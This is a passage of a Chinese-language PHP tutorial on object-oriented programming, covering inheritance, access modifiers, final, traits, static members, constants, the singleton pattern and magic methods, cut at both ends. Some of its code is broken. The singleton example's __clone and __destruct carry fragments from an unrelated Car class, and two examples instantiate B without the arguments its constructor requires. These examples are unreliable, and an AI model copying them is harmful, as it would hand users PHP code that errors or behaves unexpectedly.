class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;认真听讲,不睡觉!&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B; <span class="comment">// 访问从父类继承的成员 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span> -&gt; name,<span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span> -&gt; <span class="title function_ invoke__">say</span>(); <span class="comment">// 访问父类独有的成员 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span> -&gt; sex,<span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span> -&gt; <span class="title function_ invoke__">listen</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注意:</span></span><br><span class="line"><span class="comment">1)  B 中还可以 添加 新的成员属性和方法</span></span><br><span class="line"><span class="comment">2)  B 中还可以 重写 已有的成员方法.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">重写成员方法的时候, 参数个数要一致, 构造方法可以不一致</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p><strong>父类中的 <code>私有成员( private )</code>  在子类中也是无法访问的.</strong></p><p><strong>父类中使用 <code>受保护的 ( protected )</code> 修饰成员,  使成员在子类中也可以访问.</strong></p><table><thead><tr><th align="center"></th><th align="center">本类</th><th align="center">子类</th><th align="center">类的外部</th></tr></thead><tbody><tr><td align="center"><strong>public</strong></td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center"><strong>private</strong></td><td align="center">Y</td><td align="center">N</td><td align="center">N</td></tr><tr><td align="center"><strong>protected</strong></td><td align="center">Y</td><td align="center">Y</td><td align="center">N</td></tr></tbody></table><h2 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h2><p>在php中只支持单继承</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类 --- 人 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 学生类 继承 人类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 教师类 继承 人类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$money</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">teach</span>(<span class="params"></span>)</span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">单继承是一次只能继承一个类,不能连续继承多个类</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="子类的重载"><a href="#子类的重载" class="headerlink" title="子类的重载"></a>子类的重载</h2><p>1.如果子类对父类的方法进行重写之后,实例化的对象在调用该方法的时候,会调用子类方法.</p><p>2.如果在子类的方法中想调用父类中的同名方法,这个需要使用  <strong><code>parent::方法名()</code></strong></p><p>3.子类中重写成员方法的时候,要求参数个数和类型要一致,但是构造方法可以不一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>; </span><br><span class="line">    <span class="comment">// 重写构造方法时,参数可以不一致 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sex</span>, <span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$name</span>); </span><br><span class="line">    <span class="variable language_">$this</span> -&gt; sex = <span class="variable">$sex</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重写父类方法时,还要求参数一致(个数,类型) </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span> -&gt; <span class="title function_ invoke__">add</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><h2 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final  关键字"></a>final  关键字</h2><p>用来修饰类和成员方法, 用final修饰的类不能被继承,用final修饰的成员方法不能被重写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表示本类不能被继承 </span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="comment">// 表示该方法不能被重写 </span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;就算你叫破喉咙我也会继续写下去!&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="trait-关键字"><a href="#trait-关键字" class="headerlink" title="trait 关键字"></a>trait 关键字</h2><p>与 class 相似, 但是用 trait 定义的结构不能实例化对象</p><p>通过在类中使用use 关键字，声明要组合的Trait名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">A</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;traitA中的say方法&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">B</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;traitB中的say方法&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用 trait A和B 做为本类的组装零件 </span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">A</span>,<span class="title">B</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="title class_">Test</span>; </span><br><span class="line"><span class="variable">$obj1</span>-&gt;<span class="title function_ invoke__">fun1</span>(); <span class="comment">// 可以调用</span></span><br></pre></td></tr></table></figure><p>成员方法同名时的优先级别:    子类方法  &#x3D;&gt;  trait方法 &#x3D;&gt; 父类方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;你好呀,我是你爹.... 你是爹也是最后一个执行&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;www&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;这个是零件的方法  我是第二个执行&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">A</span>,<span class="title">B</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&#x27;122&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;这是本类中的方法最先执行.....&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">eat</span>();</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="static-静态修饰符"><a href="#static-静态修饰符" class="headerlink" title="static   静态修饰符"></a>static   静态修饰符</h2><p>写在成员属性之前, 该成员称为<strong>静态成员属性</strong></p><p>静态成员属性, 是静态的, 保存在类的定义内存中. 不管对象创建与销毁, 它都存在.</p><h3 id="a-静态成员属性"><a href="#a-静态成员属性" class="headerlink" title="a) 静态成员属性"></a>a) 静态成员属性</h3><p>​i. 静态修饰符(static)可以跟public protected private一起修饰成员属性,也可以单独来修饰成员属性</p><p>​ii. 静态成员属性 是作为该类对象的一个共有属性存在</p><p>​iii. 静态成员属性的访问方式</p><p>​1) 在类的内部  self::静态成员属性</p><p>​2) 在类的外部  类名::静态成员属性</p><h3 id="b-静态成员方法"><a href="#b-静态成员方法" class="headerlink" title="b) 静态成员方法"></a>b) 静态成员方法</h3><p>​i. 静态修饰符(static)可以跟public protected private一起修饰成员方法</p><p>​ii. 静态成员方法中只能操作静态成员, 绝对不能在静态成员方法中使用$this</p><p>​iii. 静态成员方法的访问形式</p><p>​1) 在类的内部  self::方法名</p><p>​2) 在类的外部  类名::方法名</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>类内和类外的静态成员属性访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">      <span class="built_in">static</span> <span class="keyword">public</span> <span class="variable">$abc</span> = <span class="string">&#x27;wangjs&#x27;</span>;    <span class="comment">// 1.定义静态成员</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123; </span><br><span class="line">      <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable">$abc</span>;     <span class="comment">// 2.成员方法中访问</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> A::<span class="variable">$abc</span>;     <span class="comment">// 3.外部 通过 类名::$属性名 访问</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$obj</span> = <span class="keyword">new</span> A;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$obj</span>::<span class="variable">$abc</span>;  <span class="comment">// 4.外部 通过 对象::$属性名 访问  (这样访问慢一点)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类内和类外的静态成员方法访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$abc</span> = <span class="string">&#x27;wangjs&#x27;</span>;    </span><br><span class="line">  </span><br><span class="line">      <span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"></span>)   // 1.定义静态成员方法</span></span><br><span class="line"><span class="function">      </span>&#123; </span><br><span class="line">          <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="title function_ invoke__">xxoo</span>();<span class="comment">// 2.访问静态成员方法</span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> A::<span class="title function_ invoke__">xxoo</span>();     <span class="comment">// 3.外部 通过 类名::方法名 访问</span></span><br></pre></td></tr></table></figure><h2 id="常量-const"><a href="#常量-const" class="headerlink" title="常量   const"></a>常量   const</h2><p>在类的内部定义常量, 只能使用  const</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="variable constant_">XXOO</span> = <span class="string">&#x27;wangjs&#x27;</span>;   <span class="comment">// 1.定义常量</span></span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable constant_">XXOO</span>;       <span class="comment">// 2.成员方法中 访问常量</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> A::<span class="variable constant_">XXOO</span>;     <span class="comment">// 3. 外部 类名::常量名</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>::<span class="variable constant_">XXOO</span>;  <span class="comment">// 4. 外部 对象::常量名</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>const和define的区别</strong></p><p>​i. const可以在类中定义常量  但是define不可以</p><p>​ii. define赋值的时候可以使用变量进行赋值, 在函数的内部可以使用,  const是不可以的</p><p>​iii. define可以在流程控制中定义常量(if  swtich) ,const是不可以的</p><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p>单例设计模式, 使某个类的对象仅允许实例化一次</p><p>1.不允许脚本在类的外部使用new关键字实例化对象.操作就是将构造方法和析构方法私有化</p><p>2.需要在类的内部声明一个公有的静态成员方法, 必须调用此方法 以返回实例的一个引用</p><p>3.声明静态成员属性存储新产生的对象</p><p>4.私有的__clone()方法防止克隆对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">       <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">       <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line">       <span class="built_in">static</span> <span class="keyword">private</span> <span class="variable">$obj</span>;    <span class="comment">// 1.定义 静态+私有 成员属性</span></span><br><span class="line">    </span><br><span class="line">       <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>)  // 2.私有化 构造方法  之后就不能 <span class="title">new</span> 了</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    </span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getObj</span>(<span class="params"></span>)      // 3.静态+公有, 获取一个对象</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="built_in">self</span>::<span class="variable">$obj</span>) ) &#123;</span><br><span class="line">               <span class="built_in">self</span>::<span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="string">&#x27;wangjs&#x27;</span>, <span class="number">19</span>);  <span class="comment">// 如果以前没有创建过对象,就创建一个保存起来</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$obj</span>;   <span class="comment">// 返回类中保存的对象实例</span></span><br><span class="line">       &#125;</span><br><span class="line">      </span><br><span class="line">       <span class="comment">//__clone 魔术方法进行私有化   防止在外部进行克隆操作</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;brand = <span class="string">&#x27;奇瑞&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;price = <span class="string">&#x27;13w&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//防止在对象被销毁的时候  进行实例化对象</span></span><br><span class="line">      <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">var_dump</span>(<span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&#x27;奇瑞&#x27;</span>,<span class="string">&#x27;15w&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-autoload"><a href="#1-autoload" class="headerlink" title="1.__autoload"></a>1.__autoload</h3><p>a) __autoload是一个魔术函数(不是一个魔术方法)</p><p>b) 当使用new 关键字实例化一个不存在的类的时候 ,继承一个不存在的类的时候自动触发</p><p>c) 接受一个参数  不存在的类名(字符串类型)</p><p>d) 作用就是自动加载类文件 (类的自动加载)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$className</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./libs/&#x27;</span>.<span class="variable">$className</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//注册一个自动加载类函数</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&#x27;xxoo&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-toString"><a href="#2-toString" class="headerlink" title="2.__toString"></a>2.__toString</h3><p>a) __toString是一个魔术方法 </p><p>b) 触发场景 就是当在脚本中直接对对象进行字符串操作的时候 自动触发</p><p>c) 在方法中必须要返回一个字符串类型的值</p><p>d) 作用: 代替对象进行字符串的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span 